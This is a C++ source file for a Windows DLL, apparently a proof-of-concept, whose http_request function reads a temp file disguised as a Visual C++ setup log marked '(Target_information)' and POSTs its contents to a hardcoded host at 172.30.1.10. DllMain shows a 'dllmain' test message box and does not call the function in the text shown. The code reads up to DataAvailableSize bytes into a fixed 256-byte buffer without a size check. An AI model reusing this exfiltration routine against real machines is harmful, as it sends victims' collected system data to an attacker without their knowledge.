#pragma once
#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <fstream>
#include <string>

#pragma comment(lib, "winhttp.lib")

std::string ReadFileContent(const std::wstring& filePath) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        std::cerr << "파일 read 실패" << std::endl;
        return "";
    }

    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    return content;
}

void http_request()
{
    HINTERNET hSession;
    HINTERNET hConnect;
    HINTERNET Request;
    WCHAR m_serverName[256];
    SHORT m_serverPort;

    PCWSTR pwszServerName = L"172.30.1.10";
    std::wstring tempFilePath = L"C:\\Users\\User\\AppData\\Local\\Temp\\dd_setup_Microsoft_VisualCpp.CRT_x64_(Target_information).log";
    SHORT serverPort = 80;
    PCWSTR pwszHeader = L"Content-Type: text/plain";
    PCWSTR pwszWhere = L"/localhost";

        std::string fileContent = ReadFileContent(tempFilePath);
    PBYTE pbInfoStream = (PBYTE)fileContent.c_str();
    ULONG ulInfoStreamLength = static_cast<ULONG>(fileContent.size());


    hSession = WinHttpOpen(L"HTTP Application/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    hConnect = WinHttpConnect(hSession, pwszServerName, serverPort, 0);

    RtlCopyMemory(m_serverName, pwszServerName, wcslen(pwszServerName) * sizeof(WCHAR));
    m_serverPort = serverPort;

    std::string retStream;
    ULONG DataAvailableSize = 0;
    ULONG ReceiveLength = 0;

    Request = WinHttpOpenRequest(hConnect, L"POST", pwszWhere, NULL, WINHTTP_NO_REFERER, NULL, 0);

    if (Request == NULL)
        std::cerr << "Failed to send data." << std::endl;

    if (!WinHttpSendRequest(Request, pwszHeader, 0, pbInfoStream, ulInfoStreamLength, ulInfoStreamLength, NULL))
    {
        std::cerr << "Failed to send data." << std::endl;
    }

    if (!WinHttpReceiveResponse(Request, NULL))
        std::cerr << "Failed to send data." << std::endl;

    WinHttpQueryDataAvailable(Request, &DataAvailableSize);

    if (DataAvailableSize == 0)
        std::cerr << "Failed to send data." << std::endl;

    BYTE receiveData[256] = { 0, };
    if (!WinHttpReadData(Request, receiveData, DataAvailableSize, &ReceiveLength))
    {
        std::cerr << "Failed to send data." << std::endl;
    }

    retStream = (PCHAR)receiveData;
    std::cout << "Data sent successfully and response received: " << retStream << std::endl;

    MessageBox(NULL, L"TEST", 0, 0);

    WinHttpCloseHandle(hConnect);
    hConnect = NULL;
}


BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpvReserved
)  // reserved
{
    // Perform actions based on the reason for calling.
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        MessageBox(NULL, L"dllmain", 0, 0);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        if (lpvReserved != nullptr)
        {
            break; 
        }
        break;
    }
    return TRUE;
}
